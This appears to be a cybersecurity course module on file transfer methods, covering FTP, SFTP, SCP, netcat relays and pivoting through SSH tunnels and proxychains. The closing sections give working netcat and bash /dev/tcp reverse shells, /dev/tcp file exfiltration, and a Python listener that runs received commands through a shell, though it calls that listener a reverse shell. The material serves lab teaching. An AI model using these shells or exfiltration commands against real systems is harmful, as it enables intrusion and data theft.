# FILE TRANSFER AND REDIRECTION
https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html


```
OUTCOMES
Describe Data Transfer and Exfiltration

Demonstrate File Transfer
Rationale
Learning standard file transfer protocols such as FTP,
SFTP, and SCP provides cybersecurity professionals with
essential knowledge of secure and reliable methods for
transferring files over networks, ensuring data integrity
and confidentiality. Understanding netcat and netcat relays
offers valuable insights into versatile tools commonly used
for creating network connections and transferring files,
both by defenders and malicious actors. Additionally,
familiarity with hex and base64 encoding techniques is
crucial for analyzing encoded data, which may conceal
sensitive information or malware payloads. Mastery of these
concepts equips cybersecurity practitioners with the skills
necessary to detect, prevent, and respond to file transfer-
related threats effectively, thereby bolstering the overall
security posture of their organizations.
Assessment
You will be assessed via CTFd challenges where you will need to score 28/40 points to achieve a 70%.
```

## Standard file transfer methods
- Describe common file transfer methods
- Understand the use of Active and Passive FTP modes
- Use SCP to transfer files

## Describe common methods for transferring data
https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_1_describe_standard_methods_of_transferring_files
- TFTP
- FTP
- Active
- Passive
- FTPS
- SFTP
- SCP



### TFTP
- Trivial File Transfer Protocol
- RFC 1350 Rev2    # https://tools.ietf.org/html/rfc1350
- UDP transport
- Extremely small and very simple communication
- No terminal communication
- Insecure (no authentication or encryption)
- No directory services
- Used often for technologies such as BOOTP and PXE


### FTP
- File Transfer Protocol
- RFC 959    # https://tools.ietf.org/html/rfc959
- Uses 2 separate TCP connections
- Control Connection (21) / Data Connection (20*)
- Authentication in clear-text
- Insecure in default configuration
- Has directory services
- Anonymous login


### FTP Active
![](https://git.cybbh.space/net/public/raw/master/modules/networking/slides-v4/images/ftp_active.png)


### FTP Active for Anonymous
```
bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 15:46:43 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>
```
### FTP Active for User
```
bob@bob-host:~$ ftp 10.0.0.104
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:bob): james
331 Password required for james
Password: (password)
230 User james logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp>
```

### FTP Passive
![](https://git.cybbh.space/net/public/raw/master/modules/networking/slides-v4/images/ftp_passive.png)


### FTP Passive with Wget
```
student@blue-internet-host:~$ proxychains wget -r ftp://10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
--2024-05-03 15:09:01--  ftp://10.0.0.104/
           => ‘10.0.0.104/.listing’
Connecting to 10.0.0.104:21... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... |S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:32857-<><>-OK
done.    ==> LIST ... done.

{output omitted}

FINISHED --2024-05-03 15:09:01--
Total wall clock time: 0.03s
Downloaded: 3 files, 8.4K in 0s (23.5 MB/s)
```
### FTP Passive for Anonymous
```
student@blue-internet-host:~$ proxychains ftp 10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:student): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: (no password)
230-Welcome, archive user anonymous@10.0.0.101 !
230-
230-The local time is: Fri May 03 17:20:09 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@james-host.novalocal>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,0,0,104,162,147).
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:41619-<><>-OK
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          8323 Dec 29 17:08 flag.png
-rw-r--r--   1 ftp      ftp            74 Dec 29 17:08 hint.txt
-rw-r--r--   1 ftp      ftp           170 Aug 30  2021 welcome.msg
226 Transfer complete
ftp>
```

### FTP Passive for User
```
student@blue-internet-host:~$ proxychains ftp 10.0.0.104
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:21-<><>-OK
Connected to 10.0.0.104.
220 ProFTPD Server (Debian) [::ffff:10.0.0.104]
Name (10.0.0.104:student): james
331 Password required for james
Password: (password)
230 User james logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
500 Illegal PORT command
ftp: bind: Address already in use
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,0,0,104,168,167).
|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.104:43175-<><>-OK
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp>
```

### FTPS
> File Transfer Protocol Secure
- Adds SSL/TLS encryption to FTP
- Interactive terminal access
- Explicit Mode: ports 20/21*
  - Option for Encryption
- Implicit Mode: ports 989/990*
  - Encrytion assumed

### SFTP
- Secure File Transfer Protocol
- TCP transport (port 22)
- Uses symmetric and asymmetric encryption
- Adds FTP like services to SSH
- Authentication through sign in (username and password) or with SSH key
- Interactive terminal access



## SCP
- Secure Copy Protocol
- TCP Transport (port 22)
- Uses symmetric and asymmetric encryption
- Authentication through sign in (username and password) or with SSH key
- Non-Interactive


### SCP Options
```
.  - Present working directory
-v - verbose mode
-P - alternate port
-r - recursively copy an entire directory
-3 - 3-way copy
```

### SCP Syntax
- Download a file from a remote directory to a local directory
```$ scp student@172.16.82.106:secretstuff.txt /home/student```
- Upload a file to a remote directory from a local directory
```$ scp secretstuff.txt student@172.16.82.106:/home/student```
- Copy a file from a remote host to a separate remote host
```
$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
password:    password:
```

### SCP Syntax
- Recursive upload of a folder to remote
```$ scp -r folder/ student@172.16.82.106:```
- Recursive download of a folder from remote
```$ scp -r student@172.16.82.106:folder/ .```


### SCP Syntax w/ alternate SSHD
- Download a file from a remote directory to a local directory
```$ scp -P 1111 student@172.16.82.106:secretstuff.txt .```
- Upload a file to a remote directory from a local directory
```$ scp -P 1111 secretstuff.txt student@172.16.82.106:```


### SCP Syntax through a tunnel
- Create a local port forward to target device
```$ ssh student@172.16.82.106 -L 1111:localhost:22 -NT```
- Download a file from a remote directory to a local directory
```$ scp -P 1111 student@localhost:secretstuff.txt /home/student```
- Upload a file to a remote directory from a local directory
```$ scp -P 1111 secretstuff.txt student@localhost:/home/student```


### SCP Syntax through a Dynamic Port forward
- Create a Dynamic Port Forward to target device
```$ ssh student@172.16.82.106 -D 9050 -NT```
- Download a file from a remote directory to a local directory
```$ proxychains scp student@localhost:secretstuff.txt .```
- Upload a file to a remote directory from a local directory
```$ proxychains scp secretstuff.txt student@localhost:```




## Conduct Uncommon Methods of File Transfer
https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_2_conduct_uncommon_methods_of_file_transfer
- Demonstrate the use of Netcat for data transfer
- Perform traffic redirection using Netcat relays
- Discuss the use of named and unnamed pipes
- Conduct file transfers using /dev/tcp


### NETCAT
> NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.
- Can be used for the following:
  - inbound and outbound connections, TCP/UDP, to or from any port
  - troubleshooting network connections
  - sending/receiving data (insecurely)
  - port scanning (similar to -sT in Nmap)


### NETCAT: Client to Listener file transfer
- Listener (receive file):
```nc -lvp 9001 > newfile.txt```
- Client (sends file):
```nc 172.16.82.106 9001 < file.txt```


### NETCAT: Listener to Client file transfer
- Listener (sends file):
```nc -lvp 9001 < file.txt```
- Client (receive file):
```nc 172.16.82.106 9001 > newfile.txt```


### NETCAT Relay Demos
> Listener - Listener
- On Blue_Host-1 Relay:
```
$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
```
- On Internet_Host (send):
```$ nc 172.16.82.106 1111 < secret.txt```
- On Blue_Priv_Host-1 (receive):
```$ nc 192.168.1.1 3333 > newsecret.txt```


### NETCAT Relay Demos
> Client - Client
- On Internet_Host (send):
```$ nc -lvp 1111 < secret.txt```
- On Blue_Priv_Host-1 (receive):
```$ nc -lvp 3333 > newsecret.txt```
- On Blue_Host-1 Relay:
```
$ mknod mypipe p
$ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
```

### NETCAT Relay Demos
> Client - Listener
- On Internet_Host (send):
```$ nc -lvp 1111 < secret.txt```
- On Blue_Priv_Host-1 (receive):
```$ nc 192.168.1.1 3333 > newsecret.txt```
- On Blue_Host-1 Relay:
```
$ mknod mypipe p
$ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
```



### NETCAT Relay Demos
> Listener - Client
- On Internet_Host (send):
```$ nc 172.16.82.106 1111 < secret.txt```
- On Blue_Priv_Host-1 (receive):
```$ nc -lvp 3333 > newsecret.txt```
- On Blue_Host-1 Relay:
```
$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
```

### File Transfer with /dev/tcp
- On the receiving box:
```$ nc -lvp 1111 > devtcpfile.txt```
- On the sending box:
```$ cat secret.txt > /dev/tcp/10.10.0.40/1111```
- This method is useful for a host that does not have NETCAT available.


## Reverse Shells
https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_3_reverse_shells


### Reverse shell using NETCAT
- First listen for the shell on your device.
```$ nc -lvp 9999```
- On Victim using -c :
```$ nc -c /bin/bash 10.10.0.40 9999```
- On Victim using -e :
```$ nc -e /bin/bash 10.10.0.40 9999```



### Reverse shell using /DEV/TCP
- First listen for the shell on your device.
```$ nc -lvp 9999```
- On Victim:
```$ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1```


### Reverse shell Python3
```
#!/usr/bin/python3
import socket
import subprocess
PORT = 1234        # Choose an unused port
print ("Waiting for Remote connections on port:", PORT, "\n")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', PORT))
server.listen()
while True:
    conn, addr = server.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, err = proc.communicate()
            response = output.decode() + err.decode()
            conn.sendall(response.encode())
server.close()
```





















